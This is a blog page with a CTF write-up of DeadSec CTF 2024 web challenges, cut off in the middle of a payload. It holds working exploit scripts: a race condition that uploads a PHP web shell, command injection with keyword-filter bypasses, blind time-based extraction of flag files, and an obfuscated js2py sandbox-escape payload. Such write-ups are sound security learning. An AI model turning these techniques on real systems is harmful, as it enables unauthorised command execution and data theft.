<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.26.2 by Michael Rose
  Copyright 2013-2024 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->

<html lang="en-US" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>DeadSec CTF 2024 Web Writeups - 0xOZ</title>
<meta name="description" content="This is a collection of writeups for the Web challenges of DeadSec CTF 2024. The CTF was held by the DeadSec team. The CTF was held on 28th July 2024. My team scored place 48/619 with 1081 points.">


  <meta name="author" content="Ahmad Abuzaid">
  
  <meta property="article:author" content="Ahmad Abuzaid">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="0xOZ">
<meta property="og:title" content="DeadSec CTF 2024 Web Writeups">
<meta property="og:url" content="http://0.0.0.0:8000/writeups/deadsec-ctf-2024">


  <meta property="og:description" content="This is a collection of writeups for the Web challenges of DeadSec CTF 2024. The CTF was held by the DeadSec team. The CTF was held on 28th July 2024. My team scored place 48/619 with 1081 points.">



  <meta property="og:image" content="http://0.0.0.0:8000/assets/images/deadsec-writeups/deadsec.png">





  <meta property="article:published_time" content="2024-07-28T00:00:00+03:00">





  

  


<link rel="canonical" href="http://0.0.0.0:8000/writeups/deadsec-ctf-2024">







  <meta name="google-site-verification" content="ww_2BCRJI0KecYEv76M0OGzJWWFp2kE5CEc6sZSpj7Y" />





  <meta name="naver-site-verification" content="naver-site-verification">


<!-- end _includes/seo.html -->



  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="0xOZ Feed">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script type="text/javascript">
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
  window.enable_copy_code_button = true;
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--posts" dir="ltr">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/logo.png" alt="0xOZ"></a>
        
        <a class="site-title" href="/">
          0xOZ
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a
                href="/"
                
                
              >Home</a>
            </li><li class="masthead__menu-item">
              <a
                href="/about/"
                
                
              >About</a>
            </li><li class="masthead__menu-item">
              <a
                href="/sitemap/"
                
                
              >Sitemap</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      




  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/" itemprop="item"><span itemprop="name">Home</span></a>

          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/categories/#writeups" itemprop="item"><span itemprop="name">Writeups</span></a>
          <meta itemprop="position" content="2" />
        </li>
        <span class="sep">/</span>
      
    
      
      
        <li class="current">DeadSec CTF 2024 Web Writeups</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person" class="h-card">

  
    <div class="author__avatar">
      <a href="http://0.0.0.0:8000/">
        <img src="/assets/images/bio-photo.png" alt="Ahmad Abuzaid" itemprop="image" class="u-photo">
      </a>
    </div>
  

  <div class="author__content">
    <h3 class="author__name p-name" itemprop="name">
      <a class="u-url" rel="me" href="http://0.0.0.0:8000/" itemprop="url">Ahmad Abuzaid</a>
    </h3>
    
      <div class="author__bio p-note" itemprop="description">
        <p>I am an <strong>amazing</strong> person.</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Earth</span>
        </li>
      

      
        
          
            <li><a href="mailto:iiahmad435@gmail.com" rel="nofollow noopener noreferrer me"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
        
          
        
          
        
          
            <li><a href="https://github.com/0x0OZ" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://instagram.com/0x0oz_" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
          
        
      

      

      
        <li>
          <a href="mailto:iiahmad435@gmail.com" rel="me" class="u-email">
            <meta itemprop="email" content="iiahmad435@gmail.com" />
            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="DeadSec CTF 2024 Web Writeups">
    <meta itemprop="description" content="This is a collection of writeups for the Web challenges of DeadSec CTF 2024. The CTF was held by the DeadSec team. The CTF was held on 28th July 2024. My team scored place 48/619 with 1081 points.">
    <meta itemprop="datePublished" content="2024-07-28T00:00:00+03:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">
            <a href="http://0.0.0.0:8000/writeups/deadsec-ctf-2024" itemprop="url">DeadSec CTF 2024 Web Writeups
</a>
          </h1>
          

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          12 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Table of Contents</h4></header>
              <ul class="toc__menu"><li><a href="#web">Web</a><ul><li><a href="#ezstart">EzStart</a></li><li><a href="#bing2">Bing2</a></li><li><a href="#bing_revenge">Bing_Revenge</a></li><li><a href="#retro-calculator">Retro-calculator</a></li><li><a href="#colorful-board">Colorful Board</a></li></ul></li></ul>
            </nav>
          </aside>
        
        <p>This is a collection of writeups for the Web challenges of DeadSec CTF 2024. The CTF was held by the <a href="https://deadsec.ctf.ae/">DeadSec</a> team. The CTF was held on 28th July 2024. My team scored place 48/619 with 1081 points.</p>

<h1 id="web">Web</h1>

<h2 id="ezstart">EzStart</h2>

<ul>
  <li>Difficulty: Easy</li>
</ul>

<p><img src="/assets/images/deadsec-writeups/ezstart.png" alt="EzStart" /></p>

<p>I started analyzing the provided source code, there is only one interesting file for us to discuss, the <code class="language-plaintext highlighter-rouge">src/upload.php</code></p>

<p><img src="/assets/images/deadsec-writeups/ezstart-01.png" alt="EzStart-Code" /></p>

<p>In the code, we can see that we can upload any kind of file regarding the written filters because they were pointless (no prevention after the checks). Still, the notable thing is that anything we upload is going to be deleted at the end through <code class="language-plaintext highlighter-rouge">unlink()</code>, moreover, if we upload a file with <code class="language-plaintext highlighter-rouge">&lt; 10MB</code> size it will be moved from PHP‚Äôs uploads tmp folder to accessible <code class="language-plaintext highlighter-rouge">/var/www/html/tmp</code> folder then will be removed at the end.</p>

<p>For the upload filename, we can‚Äôt specify anything existent to overwrite or cause deletion like the index.html or anything, we can‚Äôt also do path traversal because the basename and the ext were only taken from the filename</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="nv">$uploadpath</span> <span class="o">=</span> <span class="s2">"tmp/"</span><span class="p">;</span>
    <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"files"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">],</span> <span class="no">PATHINFO_EXTENSION</span><span class="p">);</span>
    <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"files"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">],</span> <span class="s2">"."</span> <span class="mf">.</span> <span class="nv">$ext</span><span class="p">);</span>
    <span class="nv">$timestamp</span> <span class="o">=</span> <span class="nb">time</span><span class="p">();</span>
    <span class="nv">$new_name</span> <span class="o">=</span> <span class="nv">$filename</span> <span class="mf">.</span> <span class="s1">'_'</span> <span class="mf">.</span> <span class="nv">$timestamp</span> <span class="mf">.</span> <span class="s1">'.'</span> <span class="mf">.</span> <span class="nv">$ext</span><span class="p">;</span>
    <span class="nv">$upload_dir</span> <span class="o">=</span> <span class="nv">$uploadpath</span> <span class="mf">.</span> <span class="nv">$new_name</span><span class="p">;</span>
</code></pre></div></div>

<p>Clearly, we can‚Äôt do anything but a race condition, the only issue is the <code class="language-plaintext highlighter-rouge">$timestamp</code> that we can‚Äôt exactly predict but can be brute-forced.</p>

<p>We need to upload a PHP file that will read the <code class="language-plaintext highlighter-rouge">/flag.txt</code> (which we know about its location from the Dockerfile) and simultaneously try to access that file.</p>

<p>I created the following script which will do all the work</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">threading</span>
<span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">re</span>


<span class="c1"># url = f"http://127.0.0.1/"
</span><span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://da93b7e95bdffb4bb4d946e2.deadsec.quest/</span><span class="sh">"</span>
<span class="n">max_threads</span> <span class="o">=</span> <span class="mi">50</span>  <span class="c1"># Set the maximum number of threads
</span>
<span class="k">def</span> <span class="nf">access_payload</span><span class="p">(</span><span class="n">timestamp</span><span class="p">):</span>
    <span class="n">file_name</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">shell_</span><span class="si">{</span><span class="nf">int</span><span class="p">(</span><span class="n">timestamp</span><span class="p">)</span><span class="si">}</span><span class="s">.php</span><span class="sh">"</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">tmp/</span><span class="sh">"</span> <span class="o">+</span> <span class="n">file_name</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span>
    <span class="k">if</span> <span class="sh">"</span><span class="s">The requested URL was not found on this server</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">DEAD{.*}</span><span class="sh">"</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Killing Task...</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">kill</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">getpid</span><span class="p">(),</span> <span class="mi">9</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">flag</span>

    <span class="k">return</span> <span class="n">flag</span>


<span class="k">def</span> <span class="nf">upload_payload</span><span class="p">():</span>
    <span class="n">file_content</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">
    &lt;?php
    system(</span><span class="sh">"</span><span class="s">cat /f*</span><span class="sh">"</span><span class="s">);
    ?&gt;
    </span><span class="sh">"""</span>
    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">files</span><span class="sh">"</span><span class="p">:</span> <span class="p">(</span><span class="sh">"</span><span class="s">shell.php</span><span class="sh">"</span><span class="p">,</span> <span class="n">file_content</span><span class="p">,</span> <span class="sh">"</span><span class="s">application/octet-stream</span><span class="sh">"</span><span class="p">)}</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">upload.php</span><span class="sh">"</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Using Max Threads of </span><span class="sh">"</span><span class="p">,</span> <span class="n">max_threads</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">65535</span><span class="p">):</span>
        <span class="n">current_timestamp</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="nf">now</span><span class="p">().</span><span class="nf">timestamp</span><span class="p">())</span>
        <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">access_payload</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">current_timestamp</span><span class="p">,))</span>
        <span class="n">t2</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">upload_payload</span><span class="p">)</span>

        <span class="n">t</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
        <span class="n">t2</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">threading</span><span class="p">.</span><span class="nf">active_count</span><span class="p">()</span> <span class="o">&gt;</span> <span class="n">max_threads</span><span class="p">:</span>
            <span class="n">t</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
            <span class="n">t2</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Max Threads Reached</span><span class="sh">"</span><span class="p">)</span>
            
</code></pre></div></div>

<p>And got the flag in no time üôÇ</p>

<p><img src="/assets/images/deadsec-writeups/ezstart-02.png" alt="EzStart-PoC" /></p>

<h2 id="bing2">Bing2</h2>

<ul>
  <li>Difficulty: Easy</li>
</ul>

<p><img src="/assets/images/deadsec-writeups/bing2.png" alt="Bing2" /></p>

<p>This one is a command injection in the <code class="language-plaintext highlighter-rouge">bing.php</code> <code class="language-plaintext highlighter-rouge">host</code> parameter, it pings the host we provide and we can inject commands there. The trick here is to bypass the filters and read the flag <code class="language-plaintext highlighter-rouge">/flag.txt</code> which one of the filters is to <em>delete</em> the keyword <code class="language-plaintext highlighter-rouge">cat</code> and <code class="language-plaintext highlighter-rouge">flag</code> from many others in the input.</p>

<p><img src="/assets/images/deadsec-writeups/bing2-01.png" alt="Bing2" /></p>

<p>Because it <em>removes</em> the keywords we can use that to generate our keywords like this:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  Bing2 curl <span class="nt">-XPOST</span> https://d931e8d7082cacac0d2a37f7.deadsec.quest/bing.php <span class="nt">-d</span> <span class="s2">"Submit"</span> <span class="nt">-d</span> <span class="s1">'ip=;id;cacatt${IFS}/f*'</span>
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
DEAD<span class="o">{</span>5b814948-3153-4dd5-a3ac-bc1ec706d766<span class="o">}</span>
</code></pre></div></div>

<p>I also used <code class="language-plaintext highlighter-rouge">${IFS}</code> as a space because spaces are blacklisted too</p>

<h2 id="bing_revenge">Bing_Revenge</h2>

<ul>
  <li>Difficulty: Easy</li>
</ul>

<p><img src="/assets/images/deadsec-writeups/bing_revenge.png" alt="Bing_Revenge" /></p>

<p>This one takes different approach than the previous, it‚Äôs a python application that will execute the command we provide in the <code class="language-plaintext highlighter-rouge">host</code> parameter, the trick here is nothing printed what so ever in the response, so we need to find a way to read the flag <code class="language-plaintext highlighter-rouge">/flag.txt</code> without seeing the output. Unfortunately, we can‚Äôt have out of band access to the server because of the firewall.</p>

<p><img src="/assets/images/deadsec-writeups/bing_revenge-01.png" alt="Bing_Revenge" /></p>

<p>In this case we can take the same approach used for time-based SQL injections, we will be reading the flags chars and comparing them, whenever our guess is correct we will sleep for few seconds (I used 7 because the server was slow).</p>

<p>The pseudo code will look like this:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">;if [ $(cat /flag.txt | cut -c</span><span class="si">{</span><span class="n">c_i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s"> | grep -c </span><span class="sh">'</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="sh">'</span><span class="s">) -eq 1 ]; then sleep </span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">sleep_time</span><span class="p">)</span><span class="si">}</span><span class="s">; fi</span><span class="sh">"</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">host</span><span class="sh">"</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">elapsed</span><span class="p">.</span><span class="nf">total_seconds</span><span class="p">()</span> <span class="o">&gt;</span> <span class="n">sleep_time</span><span class="p">:</span>
    <span class="c1"># we guessed the char correctly
</span></code></pre></div></div>

<p>Automating this with python is great and would work fine locally, but the server was slow and there might be many errors to catch through the way, so I used BurpSuite Intruder during the ctf where I sent all the possible chars for each char address <code class="language-plaintext highlighter-rouge">-c ..</code>, checked the response time that are &gt; 7 seconds and grabbed the flag manually.</p>

<p>But here is the python script that I used locally:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/bin/python3
</span><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">from</span> <span class="n">string</span> <span class="kn">import</span> <span class="n">printable</span>

<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://127.0.0.1:5000/flag</span><span class="sh">"</span>
<span class="n">flag</span> <span class="o">=</span> <span class="sh">"</span><span class="s">DEAD{</span><span class="sh">"</span>
<span class="n">sleep_time</span> <span class="o">=</span> <span class="mi">1</span>

<span class="n">chars</span> <span class="o">=</span> <span class="n">printable</span>
<span class="c1"># those always return true in the search
</span><span class="n">chars</span> <span class="o">=</span> <span class="p">(</span>
    <span class="n">chars</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">.</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">$</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">^</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
<span class="p">)</span>  <span class="c1"># mostly the flag charset is a-zA-Z0-9{}_-
</span>

<span class="k">def</span> <span class="nf">request</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">host</span><span class="sh">"</span><span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="nb">ConnectionError</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">request</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span> <span class="ow">or</span> <span class="sh">"</span><span class="s">Error</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">request</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="n">elapsed</span><span class="p">.</span><span class="nf">total_seconds</span><span class="p">()</span>


<span class="n">c_i</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">;if [ $(cat /flag.txt | cut -c</span><span class="si">{</span><span class="n">c_i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s"> | grep -c </span><span class="sh">'</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="sh">'</span><span class="s">) -eq 1 ]; then sleep </span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">sleep_time</span><span class="p">)</span><span class="si">}</span><span class="s">; fi</span><span class="sh">"</span>  <span class="c1"># this way it is possible to implement threading, but it will overload the server so I didn't try it.
</span>        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Tyring </span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">"</span><span class="se">\r</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">r</span> <span class="o">=</span> <span class="nf">request</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="k">while</span> <span class="n">sleep_time</span> <span class="o">&gt;</span> <span class="n">r</span> <span class="o">+</span> <span class="mi">4</span><span class="p">:</span>  <span class="c1"># to handle possible falst posatives
</span>            <span class="n">r</span> <span class="o">=</span> <span class="nf">request</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">r</span> <span class="o">&gt;=</span> <span class="n">sleep_time</span> <span class="ow">and</span> <span class="n">r</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">()</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="n">c</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">()</span>
            <span class="k">break</span>
    <span class="k">if</span> <span class="n">flag</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">}</span><span class="sh">"</span><span class="p">:</span>
        <span class="k">break</span>

    <span class="n">c_i</span> <span class="o">+=</span> <span class="mi">1</span>


<span class="nf">print</span><span class="p">()</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Done</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="retro-calculator">Retro-calculator</h2>

<ul>
  <li>Difficulty: Hard</li>
</ul>

<p><img src="/assets/images/deadsec-writeups/retro-calculator.png" alt="Retro-calculator" /></p>

<p>This one was a fun challenge, it‚Äôs a simple calc the trick here is that the calculator is written js2py which is a python library that can execute javascript code.</p>

<p>First there wasn‚Äôt any source code, so I started analyzing and fuzzing arround to see what‚Äôs running under the hood, when I tried to use `` to execute commands I got the following error:</p>

<p><img src="/assets/images/deadsec-writeups/retro-calculator-01.png" alt="Retro-calculator" /></p>

<p>First I thought it‚Äôs totally JS backend but after searching for the error I found that it‚Äôs js2py from <a href="https://stackoverflow.com/questions/64855107/how-to-render-ecmascript-6-with-python">here</a></p>

<p>I didn‚Äôt want to start fuzzing what works and what doesn‚Äôt or whether there was any WAFs, I started looking for any possible CVEs and found unresolved one <a href="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape">CVE-2024-28397</a>. I copied the <code class="language-plaintext highlighter-rouge">poc.py</code> payload and tried to execute, there where I started to dive into the endless ‚ÄúHacking Attempts‚Äù rabbit hole.</p>

<p><img src="/assets/images/deadsec-writeups/retro-calculator-02.png" alt="Retro-calculator" /></p>

<p>I am sure this is the worst way to go, but I kept playing around with the payload until it actually just worked (+1 for trying harder approach).</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">cmd</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">ls /; cat /flag.txt; </span><span class="dl">'</span><span class="p">;</span> <span class="nx">cmd</span><span class="p">;</span><span class="kd">let</span> <span class="nx">hacked</span><span class="p">,</span> <span class="nx">bymarve</span><span class="p">,</span> <span class="nx">n11</span><span class="p">;</span><span class="kd">let</span> <span class="nx">getattr</span><span class="p">,</span> <span class="nx">obj</span><span class="p">;</span><span class="nx">hacked</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">getOwnPropertyNames</span><span class="p">({});</span><span class="nx">bymarve</span> <span class="o">=</span> <span class="nx">hacked</span><span class="p">.</span><span class="nx">__getattribute__</span><span class="p">;</span><span class="nx">n11</span> <span class="o">=</span> <span class="nf">bymarve</span><span class="p">(</span><span class="dl">'</span><span class="s1">__getattribute__</span><span class="dl">'</span><span class="p">);</span><span class="nx">obj</span> <span class="o">=</span> <span class="nf">n11</span><span class="p">(</span><span class="dl">'</span><span class="s1">__class__</span><span class="dl">'</span><span class="p">).</span><span class="nx">__base__</span><span class="p">;</span><span class="nx">getattr</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">__getattribute__</span><span class="p">;</span><span class="kd">function</span> <span class="nf">findpopen</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span><span class="kd">let</span> <span class="nx">result</span><span class="p">;</span> <span class="kd">let</span> <span class="nx">zed</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">__sub</span><span class="dl">'</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">classes__</span><span class="dl">'</span><span class="p">;</span><span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="k">in</span>  <span class="nx">o</span><span class="p">[</span><span class="nx">zed</span><span class="p">]()){</span> <span class="kd">let</span> <span class="nx">item</span> <span class="o">=</span> <span class="nx">o</span><span class="p">[</span><span class="nx">zed</span><span class="p">]()[</span><span class="nx">i</span><span class="p">];</span><span class="kd">let</span> <span class="nx">nm</span><span class="o">=</span><span class="dl">'</span><span class="s1">__name__</span><span class="dl">'</span><span class="p">;</span> <span class="kd">let</span> <span class="nx">sb</span><span class="o">=</span><span class="dl">'</span><span class="s1">subp</span><span class="dl">'</span><span class="o">+</span><span class="dl">'</span><span class="s1">roces</span><span class="dl">'</span><span class="p">;</span><span class="k">if </span><span class="p">(</span><span class="nx">item</span><span class="p">.</span><span class="nx">__module__</span> <span class="o">==</span> <span class="nx">sb</span><span class="o">+</span><span class="dl">'</span><span class="s1">s</span><span class="dl">'</span> <span class="o">&amp;&amp;</span><span class="nx">item</span><span class="p">.</span><span class="nx">__name__</span><span class="o">==</span><span class="dl">'</span><span class="s1">P</span><span class="dl">'</span><span class="o">+</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">){</span><span class="k">return</span> <span class="nx">item</span><span class="p">}</span><span class="k">if</span><span class="p">(</span><span 